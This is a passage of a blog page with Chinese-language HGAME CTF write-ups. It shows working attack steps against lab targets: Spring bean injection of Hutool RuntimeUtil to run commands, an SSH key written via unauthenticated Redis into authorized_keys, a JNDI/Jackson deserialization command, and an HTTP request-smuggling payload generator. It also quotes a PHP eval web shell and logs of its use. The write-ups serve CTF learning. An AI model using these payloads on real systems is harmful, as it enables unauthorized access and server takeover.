+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getErrorResult</span>(Process process, Charset charset) {
+</span></span><span style="display:flex;"><span>        InputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            in <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getErrorStream</span>();
+</span></span><span style="display:flex;"><span>            String read <span style="color:#f92672">=</span> IoUtil.<span style="color:#a6e22e">read</span>(in, charset);
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> read;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Throwable th) {
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> th;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>(Process process) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">!=</span> process) {
+</span></span><span style="display:flex;"><span>            process.<span style="color:#a6e22e">destroy</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addShutdownHook</span>(Runnable hook) {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">addShutdownHook</span>(hook <span style="color:#66d9ef">instanceof</span> Thread <span style="color:#f92672">?</span> (Thread) hook : <span style="color:#66d9ef">new</span> Thread(hook));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getProcessorCount</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> cpu <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">availableProcessors</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (cpu <span style="color:#f92672">&lt;=</span> 0) {
+</span></span><span style="display:flex;"><span>            cpu <span style="color:#f92672">=</span> 7;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> cpu;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getFreeMemory</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">freeMemory</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getTotalMemory</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">totalMemory</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getMaxMemory</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">maxMemory</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getUsableMemory</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (getMaxMemory() <span style="color:#f92672">-</span> getTotalMemory()) <span style="color:#f92672">+</span> getFreeMemory();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getPid</span>() <span style="color:#66d9ef">throws</span> UtilException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Pid.<span style="color:#a6e22e">INSTANCE</span>.<span style="color:#a6e22e">get</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String<span style="color:#f92672">[]</span> <span style="color:#a6e22e">handleCmds</span>(String... cmds) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ArrayUtil.<span style="color:#a6e22e">isEmpty</span>((Object<span style="color:#f92672">[]</span>) cmds)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NullPointerException(<span style="color:#e6db74">&#34;Command is empty !&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (1 <span style="color:#f92672">==</span> cmds.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>            String cmd <span style="color:#f92672">=</span> cmds<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (StrUtil.<span style="color:#a6e22e">isBlank</span>(cmd)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NullPointerException(<span style="color:#e6db74">&#34;Command is blank !&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            cmds <span style="color:#f92672">=</span> cmdSplit(cmd);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> cmds;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String<span style="color:#f92672">[]</span> <span style="color:#a6e22e">cmdSplit</span>(String cmd) {
+</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> cmds <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> cmd.<span style="color:#a6e22e">length</span>();
+</span></span><span style="display:flex;"><span>        Stack<span style="color:#f92672">&lt;</span>Character<span style="color:#f92672">&gt;</span> stack <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Stack<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">boolean</span> inWrap <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        StrBuilder cache <span style="color:#f92672">=</span> StrUtil.<span style="color:#a6e22e">strBuilder</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> length; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> cmd.<span style="color:#a6e22e">charAt</span>(i);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">switch</span> (c) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39; &#39;</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (inWrap) {
+</span></span><span style="display:flex;"><span>                        cache.<span style="color:#a6e22e">append</span>(c);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        cmds.<span style="color:#a6e22e">add</span>(cache.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>                        cache.<span style="color:#a6e22e">reset</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;\&#34;&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (inWrap) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> stack.<span style="color:#a6e22e">peek</span>().<span style="color:#a6e22e">charValue</span>()) {
+</span></span><span style="display:flex;"><span>                            stack.<span style="color:#a6e22e">pop</span>();
+</span></span><span style="display:flex;"><span>                            inWrap <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        cache.<span style="color:#a6e22e">append</span>(c);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        stack.<span style="color:#a6e22e">push</span>(Character.<span style="color:#a6e22e">valueOf</span>(c));
+</span></span><span style="display:flex;"><span>                        cache.<span style="color:#a6e22e">append</span>(c);
+</span></span><span style="display:flex;"><span>                        inWrap <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">default</span>:
+</span></span><span style="display:flex;"><span>                    cache.<span style="color:#a6e22e">append</span>(c);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (cache.<span style="color:#a6e22e">hasContent</span>()) {
+</span></span><span style="display:flex;"><span>            cmds.<span style="color:#a6e22e">add</span>(cache.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (String<span style="color:#f92672">[]</span>) cmds.<span style="color:#a6e22e">toArray</span>(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /api/gateway HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: node1.hgame.vidar.club:31791
+</span></span><span style="display:flex;"><span>Accept-Language: zh-CN,zh;q<span style="color:#f92672">=</span>0.9,en;q<span style="color:#f92672">=</span>0.8,en-GB;q<span style="color:#f92672">=</span>0.7,en-US;q<span style="color:#f92672">=</span>0.6
+</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;beanName&#34;</span>:<span style="color:#e6db74">&#34;cn.hutool.extra.spring.SpringUtil&#34;</span>,<span style="color:#e6db74">&#34;methodName&#34;</span>:<span style="color:#e6db74">&#34;registerBean&#34;</span>,<span style="color:#e6db74">&#34;params&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;arg0&#34;</span>:<span style="color:#e6db74">&#34;shell&#34;</span>,<span style="color:#e6db74">&#34;arg1&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;@type&#34;</span>:<span style="color:#e6db74">&#34;cn.hutool.core.util.RuntimeUtil&#34;</span><span style="color:#f92672">}}}</span>
+</span></span></code></pre></div><p><img alt="2025-02-22193119" loading="lazy" src="../../images/Hgame/2025-02-22193119.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span> {<span style="color:#f92672">&#34;beanName&#34;</span>:<span style="color:#e6db74">&#34;shell&#34;</span>,<span style="color:#f92672">&#34;methodName&#34;</span>:<span style="color:#e6db74">&#34;execForStr&#34;</span>,<span style="color:#f92672">&#34;params&#34;</span>:{<span style="color:#f92672">&#34;arg0&#34;</span>:<span style="color:#e6db74">&#34;utf8&#34;</span>,<span style="color:#f92672">&#34;arg1&#34;</span>:[<span style="color:#e6db74">&#34;whoami&#34;</span>]}}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /api/gateway HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: node1.hgame.vidar.club:31791
+</span></span><span style="display:flex;"><span>Accept-Language: zh-CN,zh;q<span style="color:#f92672">=</span>0.9,en;q<span style="color:#f92672">=</span>0.8,en-GB;q<span style="color:#f92672">=</span>0.7,en-US;q<span style="color:#f92672">=</span>0.6
+</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;beanName&#34;</span>:<span style="color:#e6db74">&#34;shell&#34;</span>,<span style="color:#e6db74">&#34;methodName&#34;</span>:<span style="color:#e6db74">&#34;execForStr&#34;</span>,<span style="color:#e6db74">&#34;params&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;arg0&#34;</span>:<span style="color:#e6db74">&#34;utf8&#34;</span>,<span style="color:#e6db74">&#34;arg1&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/readflag&#34;</span><span style="color:#f92672">]}}</span>
+</span></span></code></pre></div><p><img alt="2025-02-22193559" loading="lazy" src="../../images/Hgame/2025-02-22193559.png"></p>
+<h3 id="level-257-日落的紫罗兰">Level 257 日落的紫罗兰<a hidden class="anchor" aria-hidden="true" href="#level-257-日落的紫罗兰">#</a></h3>
+<p>nmap可以扫一下这两个端口，一个是ssh，一个是redis,redis无密码</p>
+<p>首先的思路是对ssh进行爆破，利用hydra利用字典看看能不能爆出来，没有成功。</p>
+<p>尝试之后ssh连接不了，redis里面没东西，题目给了user.txt，可以尝试写个id_rsa上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ssh-keygen -t rsa
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>echo -e “<span style="color:#ae81ff">\n\n</span>”; cat ./id_rsa.pub; echo -e “<span style="color:#ae81ff">\n\n</span>”<span style="color:#f92672">)</span> &gt; spaced_key.txt
+</span></span><span style="display:flex;"><span> cat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p <span style="color:#ae81ff">30877</span> -x set ssh_key <span style="color:#75715e">#将 SSH 公钥存储到 Redis 的 ssh_key 键下。</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!<span style="color:#f92672">[</span>2025-02-22203924<span style="color:#f92672">](</span>../../images/Hgame/2025-02-22203924.png<span style="color:#f92672">)</span>└─$ redis-cli  -h node1.hgame.vidar.club -p <span style="color:#ae81ff">30877</span>
+</span></span><span style="display:flex;"><span>node1.hgame.vidar.club:30877&gt;  config set dir /home/mysid/.ssh
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>node1.hgame.vidar.club:30877&gt; config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>node1.hgame.vidar.club:30877&gt; save
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>node1.hgame.vidar.club:30877&gt; exit
+</span></span></code></pre></div><p>将 Redis 数据存储在 <code>authorized_keys</code> 文件中，了利用 Redis 来管理 SSH 公钥，从而实现远程身份验证。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa mysid@node1.hgame.vidar.club -p <span style="color:#ae81ff">30156</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp -i ./id_rsa -P <span style="color:#ae81ff">30156</span> /JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l <span style="color:#ae81ff">389</span> -u <span style="color:#e6db74">&#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn&#34;</span>
+</span></span></code></pre></div><p>再开个窗口先ssh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> curl -X POST -d <span style="color:#e6db74">&#34;baseDN=a/b&amp;filter=a&#34;</span> http://127.0.0.1:8080/search
+</span></span></code></pre></div><p>最后就可以cat /flag了(：</p>
+<p><img alt="2025-02-22203924" loading="lazy" src="../../images/Hgame/2025-02-22203924.png"></p>
+<h3 id="level-111-不存在的车厢">Level 111 不存在的车厢<a hidden class="anchor" aria-hidden="true" href="#level-111-不存在的车厢">#</a></h3>
+<p>长度字段使用 uint16（2字节），限制单个字段最大为 65535 字节，所以当⼀个⼤于uint16最⼤值的Length被序列化时会 产⽣整数溢出，改变序列化后的语义  H111协议存在pipeline以及连接复⽤，前⾯搁置的部分数据会被按照第⼆个 请求解析并响应，在外部第⼆个请求打到proxy的时候，有⼀定概率复⽤同个连接并⾛私出这⼀部分 response</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">TestGenRequest</span>(<span style="color:#a6e22e">t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">testing</span>.<span style="color:#a6e22e">T</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 创建一个包含完整信息的测试请求</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">testReq</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Method</span>:     <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">RequestURI</span>: <span style="color:#e6db74">&#34;/flag&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Header</span>: <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>][]<span style="color:#66d9ef">string</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span>: {<span style="color:#e6db74">&#34;application/json&#34;</span>},
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;User-Agent&#34;</span>:   {<span style="color:#e6db74">&#34;test-client&#34;</span>},
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Body</span>: <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">NopCloser</span>(<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#e6db74">&#34;test body&#34;</span>)),
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 序列化请求</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">WriteH111Request</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">testReq</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;expected no error, got %v&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 打印序列化后的二进制数据长度和十六进制表示</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Logf</span>(<span style="color:#e6db74">&#34;Serialized length: %d bytes&#34;</span>, len(<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">Bytes</span>()))
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Logf</span>(<span style="color:#e6db74">&#34;Hex dump: %s&#34;</span>, <span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">EncodeToString</span>(<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">Bytes</span>()))
+</span></span></code></pre></div><p>放在protocol/request_test.go，通过gotest-v拿到输出</p>
+<p>最后放yakit里</p>
+<p><img alt="2025-02-22211012" loading="lazy" src="../../images/Hgame/2025-02-22211012.png"></p>
+<h1 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h1>
+<h3 id="computer-cleaner">Computer cleaner<a hidden class="anchor" aria-hidden="true" href="#computer-cleaner">#</a></h3>
+<p>正常导入vm</p>
+<p>搜索危险函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -rn <span style="color:#e6db74">&#34;eval(&#34;</span> /var/www/html
+</span></span><span style="display:flex;"><span>/var/www/html/uploads/shell.php:1:&lt;?php @eval<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;hgame{y0u_&#39;</span><span style="color:#f92672">])</span>;?&gt;
+</span></span></code></pre></div><p>然后看/var/log里面的日志</p>
+<p>有一天是<code>121.41.34.25</code>访问得到第二部分flag</p>
+<p>第三部分也是看日志</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1.41.34.25 - - <span style="color:#f92672">[</span>17/Jan/2025:12:02:05 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /uploads/shell.php?cmd=cat%20~/Documents/flag_part3 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">2048</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#34;</span>
+</span></span><span style="display:flex;"><span>vidar@vidar-computer:/var/www/html$ cat ~/Documents/flag_part3
+</span></span><span style="display:flex;"><span>_c0mput3r!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>最后得到</p>
+<pre tabindex="0"><code>hgame{y0u_hav3_cleaned_th3_c0mput3r!}
+</code></pre><h3 id="computer-cleaner-plus">Computer cleaner plus<a hidden class="anchor" aria-hidden="true" href="#computer-cleaner-plus">#</a></h3>
+<p>进行ps发现denied，查看一下发现后门</p>
+<p><img alt="2025-02-22140449" loading="lazy" src="../../images/Hgame/2025-02-22140449.png"></p>
+<p><code>hgame{B4ck_D0_oR}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">0raN9e&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
